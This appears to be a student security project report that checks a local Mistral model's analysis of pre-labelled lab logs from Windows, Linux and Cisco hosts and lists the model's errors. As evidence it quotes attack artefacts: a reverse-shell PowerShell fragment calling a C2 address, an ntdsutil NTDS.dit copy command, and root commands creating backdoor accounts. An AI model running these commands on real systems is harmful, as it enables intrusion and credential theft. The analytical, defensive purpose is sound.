# AI-Assisted Log Analysis — Week 2 (DEPI Project 5)

> **AI-drafted, human-validated.** Mistral produced the draft analysis; every
> claim below was checked against the supplied logs. Only validated claims are
> stated as findings; the model's errors are listed separately in §3 and in
> `hallucination-validation-log.csv`.

| Field | Value |
|---|---|
| Date | 2026-10-15 |
| Model | mistral (local, via Ollama) |
| Log sources analysed | Windows Security events; Linux (Kali) auth/auditd; Cisco/network (GNS3) syslog |
| Status | Provisional — single run per source, single reviewer |

> **Important caveat on the inputs.** The log sets fed to the model were
> *pre-labelled*: each event carried a `Category` ("Malicious"/"Normal") and a
> `Description` that already stated the verdict. Real Windows 4688/4720/7036
> events contain no such fields. So most of the model's "findings" are echoes of
> labels it was handed, not independent analysis — see §4. The results below are
> still graded honestly against those inputs.

---

## 1. Windows host (DESKTOP-32GLMCG) — validated analysis

### 1.1 Summary (corrected)
Five Security events were supplied, spanning 01:10–01:22 on 2026-10-15. Three are
labelled malicious (an encoded PowerShell process, a new local account, and an
ntdsutil run) and **two are labelled normal** (a Chrome launch and a Windows
Update service start). The model's claim of "no normal activities" is wrong.

### 1.2 Timeline (complete — all 5 events)
| # | Time (UTC) | EventID | What the log shows |
|---|---|---|---|
| W-001 | 01:10:05 | 4688 | `cmd.exe /c powershell -Enc …` spawned from **rundll32.exe**, user Shahy |
| W-002 | 01:12:40 | 4720 | Local account **ShadowAdmin** created by Shahy |
| W-003 | 01:15:22 | 4688 | `ntdsutil … ifm … create full C:\Windows\Temp\NTDS` run as SYSTEM |
| W-004 | 01:20:00 | 4688 | chrome.exe launched from explorer.exe (normal) |
| W-005 | 01:22:15 | 7036 | Windows Update service entered running state (normal) |

### 1.3 Confirmed findings (supported by the evidence)
- An encoded PowerShell process (W-001) was spawned by **rundll32.exe** — an
  unusual parent for a shell. Decoding the `-Enc` payload yields
  `New-Object System.Net.Sockets.TCPClient("192.168.1.100",8080)` → a
  **reverse shell to C2 192.168.1.100:8080**. *(This IOC is recoverable from the
  evidence; the model did not surface it.)*
- A local account **ShadowAdmin** (SID …-1005) was created by user Shahy (W-002).
- `ntdsutil` was run with the **IFM / "create full"** option (W-003), the
  technique used to extract an NTDS.dit copy.
- Two benign events are present (W-004 Chrome, W-005 Windows Update).

### 1.4 Reasonable interpretation (marked as inference)
- **Inference (medium):** W-001→W-002→W-003 is the shape of initial execution →
  persistence → credential access.
- **Inference (needs verification):** the "NTDS.dit dumping" label is
  **questionable in context** — NTDS.dit exists only on a Domain Controller, but
  this host is a workstation (`DESKTOP-…`, local SIDs). On a standalone desktop
  the ntdsutil IFM command has no directory database to export, so this likely
  fails or is mislabelled. A human must confirm the machine's role.

---

## 2. Linux host (kali-control) — validated analysis

> This was the strongest of the three runs: complete timeline, correct
> fact-vs-hypothesis separation, and appropriately moderate confidence.

### 2.1 Summary
Five events over 01:42–01:50 on 2026-10-15: a successful SSH login, a cron
service start, a sudo `apt update`, a **failed SSH login for `admin` from an
external IP**, and — 3 seconds later — a **root shell creating a backdoor user**.

### 2.2 Timeline (complete — all 5 events)
| # | Time (UTC) | EventID | What the log shows |
|---|---|---|---|
| L-001 | 01:42:10 | 1001 | Accepted SSH password for **shahy** from 192.168.1.105 (internal) |
| L-002 | 01:45:00 | 1002 | systemd started `cron.service` (normal) |
| L-003 | 01:48:22 | 1003 | `sudo /usr/bin/apt update` by shahy on pts/0 (normal) |
| L-004 | 01:50:12 | 1004 | **Failed** SSH auth for invalid user **admin** from **185.220.101.5** (external) |
| L-005 | 01:50:15 | 1005 | auditd EXECVE: `/bin/bash -c "useradd -m backdoor_user && ip a"` as **root**, parent **sshd** |

### 2.3 Confirmed findings
- A backdoor account **`backdoor_user`** was created by a root shell, followed by
  interface enumeration (`ip a`) — L-005, parent process sshd.
- A failed external SSH attempt against a non-existent `admin` account from
  **185.220.101.5** — L-004.
- Legitimate activity: shahy's internal SSH login (L-001), cron start (L-002),
  sudo apt update (L-003).

### 2.4 Reasonable interpretation (marked as inference)
- **Inference (medium):** L-004 and L-005 are only **3 seconds apart** and L-005
  runs as root from an sshd session — this looks like external access followed
  immediately by persistence. The model listed both but **did not connect them**.
- **Inference / key gap:** there is **no successful root-login event** in these
  logs explaining how the root shell in L-005 was obtained. A single *failed*
  login (L-004) cannot produce it. Either successful logins are missing from the
  sample, or root came via shahy's session (L-001 → sudo L-003). This missing
  link is the single most important thing to pull next.
- **Enrichment (do not assert):** 185.220.101.5 should be looked up in a
  threat-intel feed — the 185.220.101.0/24 range is commonly associated with Tor
  exit nodes, but that must be verified by a human, not stated as fact here.

---

## 3. Network (Cisco / GNS3 syslog) — validated analysis

### 3.1 Summary
Four events over 2026-09-23 → 09-24: two interface/HSRP state changes, one RIP
routing update, and one **RIP authentication failure**.

### 3.2 Timeline (complete — all 4 events)
| # | Time (UTC) | Log ID | What the log shows |
|---|---|---|---|
| N-001 | 2026-09-23 21:20:14 | c0c326bc6a6b4f95 | Loopback0 line protocol up (host 192.168.100.44) |
| N-002 | 2026-09-24 23:28:43 | 16584d09716f4657 | FastEthernet1/0 HSRP Grp 1 Standby→Active (host **10.0.0.1**) |
| N-003 | 2026-09-24 23:47:40 | 28233618acc31921 | RIP v2 update to 224.0.0.9 via Eth0/0 (192.168.100.44) |
| N-004 | 2026-09-24 23:53:15 | 40148944acebc179 | **RIP ignored v2 packet from 10.0.0.1 (invalid authentication)** |

### 3.3 Confirmed findings
- The security-relevant event is **N-004**: a RIP v2 packet from 10.0.0.1 was
  dropped for failing authentication. This can indicate a **route-injection /
  spoofing attempt**, or simply a misconfigured neighbor. (Correctly flagged by
  the model.)

### 3.4 Reasonable interpretation
- **Inference (low):** one failed RIP auth from 10.0.0.1 is not enough to call an
  attack. Note that 10.0.0.1 is also the host in N-002 (a legitimate HSRP state
  change), so it is a known device on the segment — which makes a
  **misconfiguration** at least as likely as spoofing. Needs more events to tell.

---

## 4. What the AI got wrong or missed (pulled from the validation log)
| ID | Issue | Severity |
|---|---|---|
| W-B | Claimed "no normal activities" — contradicts W-004 and W-005 | Medium |
| W-C | Timeline omitted the 2 normal events | Medium |
| W-D | Invented "Log ID 1/2/3" — input had no stable IDs | Low |
| W-E | Accepted "NTDS.dit dumping" without noting the host isn't a DC | Medium |
| W-F | Did not decode the payload → missed the C2 (192.168.1.100:8080) | Medium |
| L-D | Renumbered the Linux EventIDs 1001–1005 as "1–5" | Low |
| L-F | Did not connect L-004→L-005 (3s apart) or flag the missing root-login event | Medium |
| L-G | Did not list the external IP 185.220.101.5 for enrichment | Low |
| N-C | Claimed 10.0.0.1 "doesn't match any interface change" — it is the host in N-002 | Medium |

## 5. How the AI did on the log-analysis task
Grading against the supplied logs: of **16 checked claims — 7 fully supported, 4
partially supported, 5 contradicted/unsupported.**

Ranking the three runs:
- **Linux — best.** Complete timeline, correct fact-vs-hypothesis separation,
  moderate confidence. Only gap: didn't correlate the two late events or flag the
  missing root-login.
- **Network — good.** Complete, accurate, low confidence, no invented IOCs; one
  real error (the false claim about 10.0.0.1).
- **Windows — weakest.** Dropped the 2 normal events, claimed "no normal
  activity," invented log IDs, and missed the C2 address in the payload.

The bigger lesson: because the inputs were **pre-labelled with the answers**, the
model mostly restated the `Description` field, yet it *still* introduced factual
errors — dropped events, a contradiction, and invented IDs. That is the headline
result for Week 2: even when handed the verdict, a small local model needs a human
check. To make the test meaningful, the next run must use **raw logs with no
`Category`/`Description` fields** (what `export-windows-events.ps1` and
`export-linux-logs.sh` produce), graded against a separate `ground-truth.md`.
